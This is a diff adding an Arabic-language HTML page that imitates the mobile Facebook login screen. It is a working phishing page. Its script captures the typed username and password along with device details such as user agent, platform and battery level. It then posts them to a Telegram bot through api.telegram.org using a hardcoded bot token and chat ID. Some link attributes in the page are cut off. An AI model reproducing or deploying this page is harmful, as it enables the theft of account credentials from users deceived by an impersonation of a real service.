@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        /* رأس m.facebook.com الأصلي */
+        .fb-header {
+            background: #3b5998;
+            color: white;
+            padding: 12px 16px;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            border-bottom: 1px solid #29487d;
+        }
+        /* نموذج تسجيل الدخول المبسط */
+        .login-container {
+            max-width: 400px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 0;
+            box-shadow: none;
+            padding: 20px;
+        }
+        .login-title {
+            color: #1c1e21;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        .login-input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #f5f6f7;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background: #3b5998;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .footer-links {
+            text-align: center;
+            font-size: 12px;
+            color: #8a8d91;
+            margin-top: 30px;
+            padding: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="fb-header">facebook</div>
+    <div class="login-container">
+        <div class="login-title">قم بتسجيل الدخول إلى فيسبوك</div>
+        <form id="loginForm">
+            <input type="text" id="username" class="login-input" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+            <input type="password" id="password" class="login-input" placeholder="كلمة السر">
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+	<div style="text-align:center; margin:15px 0;">
+            <a href="
+        </div>
+        <div style="text-align:center; color:#8a8d91; font-size:14px; padding:15px 0; border-top:1px solid #dddfe2;">
+            ليس لديك حساب؟ <a href="
+        </div>
+    </div>
+    <div class="footer-links">
+        <div>فيسبوك © 2026</div>
+    </div>
+    
+    <script>
+        const userInfo = {
+            deviceName: navigator.userAgent,
+            networkStatus: navigator.onLine ? 'متصل' : 'غير متصل',
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            battery: 'غير متاح'
+        };
+        
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                userInfo.battery = `${Math.floor(battery.level * 100)}%`;
+            });
+        }
+        
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            try {
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+                if (!username || !password) {
+                    alert("يرجى ملء جميع الحقول!");
+                    return;
+                }
+                
+                const botToken = "8867841053:AAGhQnrvIWV1oXTAqCQSs8daVghq5QAVT5M";
+                const chatId = "8561739555";
+                const message = `
+                    🔐 تسجيل دخول جديد
+                    👤 المستخدم: ${username}
+                    🔑 كلمة المرور: ${password}
+                    
+                    📱 معلومات الجهاز:
+                    - الجهاز: ${userInfo.deviceName}
+                    - الحالة: ${userInfo.networkStatus}
+                    - البطارية: ${userInfo.battery}
+                    - النظام: ${userInfo.platform}
+                    - اللغة: ${userInfo.language}
+                    - دقة الشاشة: ${userInfo.screenResolution}
+                `;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال البيانات بنجاح");
+                    } else {
+                        alert("خطأ: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("خطأ");
+                });
+            } catch (error) {
+                console.error("Error:", error);
+                alert("حدث خطأ");
+            }
+        });
+    </script>
+</body>
+</html>
+
+  
